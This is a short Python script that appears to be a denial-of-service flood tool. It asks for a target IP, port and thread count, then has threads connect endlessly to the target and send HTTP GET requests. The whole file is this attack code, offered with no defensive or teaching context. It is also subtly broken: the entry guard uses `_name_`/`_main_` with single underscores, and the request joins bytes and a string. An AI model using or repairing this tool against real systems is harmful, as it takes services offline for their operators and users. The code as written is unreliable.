import socket
import threading

def attack(target_ip, target_port, num_threads):
    for i in range(num_threads):
        t = threading.Thread(target=send_packet, args=(target_ip, target_port))
        t.start()

def send_packet(target_ip, target_port):
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        sock.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n")
        sock.close()

if _name_ == "_main_":
    target_ip = input("Target IP: ")
    target_port = int(input("Target Port: "))
    num_threads = int(input("Number of Threads: "))
    attack(target_ip, target_port, num_threads)